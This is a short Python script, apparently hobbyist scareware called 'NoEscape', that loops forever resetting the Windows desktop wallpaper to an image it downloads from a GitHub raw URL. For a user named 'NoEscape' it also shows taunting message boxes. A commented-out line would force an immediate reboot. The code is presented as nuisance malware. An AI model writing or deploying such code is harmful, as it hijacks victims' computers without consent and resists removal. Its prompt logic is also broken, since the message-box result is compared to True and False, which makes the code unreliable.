import requests
import os.path
import ctypes
from time import sleep
import os
from tkinter import *
from tkinter import messagebox
 
# using getlogin() returning username


while True:

    ctypes.windll.user32.SystemParametersInfoW(20, 0, r"C:\image.PNG", 0)

    if os.getlogin() == "NoEscape":
        tof = messagebox.askquestion("NoEscape", "Do you like your computer?")
        if tof == True:
            messagebox.showerror("NoEscape", "Well, that's too bad.")
        elif tof == False:
            #os.system("shutdown -r -t 0")
            print("ok")
        sleep(9999)
        
    if os.path.isfile("C:\image.PNG") == False:
        
        if os.getlogin() == "NoEscape":
            pass
        else:
            url = 'https://raw.githubusercontent.com/Calvin-CoolestYT/SODv2/main/image.PNG'
            r = requests.get(url, allow_redirects=True)
            open('C:\image.PNG', 'wb').write(r.content)

    sleep(5)

